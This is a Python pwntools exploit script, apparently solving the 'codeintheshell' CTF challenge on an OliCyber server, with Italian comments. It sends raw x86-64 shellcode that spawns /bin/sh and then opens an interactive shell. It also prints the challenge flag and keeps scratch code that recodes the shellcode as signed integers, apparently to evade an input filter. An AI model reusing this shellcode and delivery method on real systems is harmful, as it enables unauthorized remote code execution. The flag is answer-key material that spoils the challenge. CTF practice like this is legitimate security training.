#! /usr/bin/env python3

from pwn import *

# conn = process('./codeintheshell')
conn = remote('codeintheshell.challs.olicyber.it',10018)

conn.recvuntil('povero)')
# da questo punto
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode =  b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

conn.sendline(shellcode)
conn.interactive()



# flag{n3w_k00l_l4nGu4g3}

# codice a caso
# shellcode = shellcode[::-1]
# shellcode = [b'\x05\x0f;\xb0', b'^TWR', b'-f\xa0\xab\xab', b'-$\x08\xb6\xff', b'-hs/m', b'-ib.C', b'H\xc01\x00']
# [b'\x05\x0f;', b'-O\xa1\xab\xa7', b'R\x99_T', b'S\xdb\xf7H', b'-hs.', b'-nib-', b'-D\xb7?\xcd'] # con lo zero dallaltra parte
# region creazione shellcode
# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x00"
# print(shellcode)

# finalShellcode = []
# for byte in range(0,28,4):
#     currentBytes = shellcode[byte:byte + 4].hex()
#     ints = int(currentBytes,16)
#     if ints > 2147483647:
#         ints -= 0xffffffff - 1
#     #     try:
#     #         ints = b'-' + bytes.fromhex(hex(ints)[3:])
#     #     except:
#     #         ints = b'-' + bytes.fromhex('0' + hex(ints)[3:])
#     # else:
#     #     try:
#     #         ints = bytes.fromhex(hex(ints)[2:])
#     #     except:
#     #         ints = bytes.fromhex('0' + hex(ints)[2:])
    
#     finalShellcode.append(str(ints))

# print(finalShellcode)
# endregion


shellcode = [b'1\xc0H\xbb', b'-.bim', b'-/sg\xff', b'H\xf7\xdbS', b'T_\x99R', b'WT^\xb0', b';\x0f\x05']
shellcode = ['834685115', '-778201453', '-796092415', '1224203091', '1415551314', '1465147056', '990840064']